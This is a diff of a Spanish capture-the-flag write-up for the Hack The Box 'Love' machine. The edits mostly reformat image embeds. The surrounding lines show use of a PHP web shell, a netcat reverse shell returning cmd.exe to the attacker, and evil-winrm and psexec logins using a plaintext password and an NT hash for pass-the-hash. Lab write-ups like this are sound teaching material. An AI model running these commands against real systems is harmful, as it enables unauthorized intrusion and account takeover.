@@ -415,7 +415,7 @@ http://10.10.10.239/images/quesedice.php?xmd=whoami
 
 Obtenemos:
 
-![344page80_images_quesedicePHP_whoami](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_images_quesedicePHP_whoami.png)
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_images_quesedicePHP_whoami.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
 
 Opa, tenemos ejecución remota de comandos (: El usuario que esta ejecutando el servidor web se llama `phoebe`, por lo tanto vamos a estar ejecutando comandos como ese usuario (:
 
@@ -446,7 +446,7 @@ Validamos que se haya descargado y exista en el sistema:
 http://10.10.10.239/images/quesedice.php?xmd=dir c:\Users\phoebe\Videos\nc.exe
 ```
 
-![344page80_images_quesedicePHP_dir_videos](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_images_quesedicePHP_dir_videos.png)
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_images_quesedicePHP_dir_videos.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
 
 Listones, ahora simplemente le indicamos que una vez entable una conexión con el puerto **4433** de nuestra máquina nos lance por ahí una `cmd.exe` (una terminal de **Windows**).
 
@@ -465,15 +465,15 @@ http://10.10.10.239/images/quesedice.php?xmd=c:\Users\phoebe\Videos\nc.exe 10.10
 
 YyyyyYyaysdfyyayyYYYYyy:
 
-![344bash_nc_phoebe_RevSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_nc_phoebe_RevSH.png)
-
-Peeeeeeeeerfecto, tamos con una terminal en el sistema como el usuario **phoebe**.
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_nc_phoebe_RevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
 
 <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344google_gif_yeahslowgolf.gif" style="display: block; margin-left: auto; margin-right: auto; width: 70%;"/>
 
+Peeeeeeeeerfecto, tamos con una terminal en el sistema como el usuario **phoebe**.
+
 ...
 
-He creado un script para facilitar la ejecución remota de comandos, solo debemos pasarle el "comando" y no debemos preocuparnos de nada más (:
+He creado un script para facilitar la ejecución remota de comandos, solo debemos pasarle el **comando** y no debemos preocuparnos de nada más (:
 
 > [arbitrary_up_RCE.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/love/arbitrary_up_RCE.py).
 
@@ -506,7 +506,7 @@ Pero haciendo reutilización de contraseñas y jugando con la herramienta [evil-
 ❱ evil-winrm -i 10.10.10.239 -u 'phoebe' -p 'HTB#9826^(_'
 ```
 
-![344bash_evilwinrm_phoebe](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_evilwinrm_phoebe.png)
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_evilwinrm_phoebe.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
 
 Así que ya podemos salirnos de la **Reverse Shell** (:
 
@@ -677,11 +677,11 @@ Por ejemplo para el usuario **Phoebe** tomaríamos su hash y escribiríamos:
 ❱ evil-winrm -i 10.10.10.239 -u 'phoebe' -H a9ccd3a011ceb45b44ce6f6b40122268
 ```
 
-![344bash_evilwinrm_pth_phoebe](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_evilwinrm_pth_phoebe.png)
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_evilwinrm_pth_phoebe.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
 
 Y haríamos lo mismo con el usuario **Administrator** (con el que realmente no nos sabemos su contraseña):
 
-![344bash_evilwinrm_pth_admin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_evilwinrm_pth_admin.png)
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_evilwinrm_pth_admin.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
 
 😜 🥴 😵
 
@@ -702,7 +702,7 @@ Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corpo
 
 **Administrator**:
 
-![344bash_psexec_pth_admin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_psexec_pth_admin.png)
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_psexec_pth_admin.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
 
 ...
 
